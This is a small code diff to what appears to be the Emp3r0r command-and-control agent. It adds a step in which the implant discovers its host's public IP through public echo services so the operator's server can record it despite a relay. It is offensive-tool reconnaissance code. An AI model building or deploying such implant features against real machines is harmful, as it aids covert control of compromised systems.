@@ -127,6 +127,11 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	// IP address?
 	info.IPs = netutil.IPa()
 
+	// External (public) egress IP: the CC cannot see it when we dial in
+	// through the relay (it only sees the relay's address), so self-detect
+	// it now — best effort, first answer from 3 random public echo services.
+	info.ExternalIP = GetExternalIP()
+
 	// arp -a ?
 	// Minimal: skip ARP
 	info.ARP = []string{}
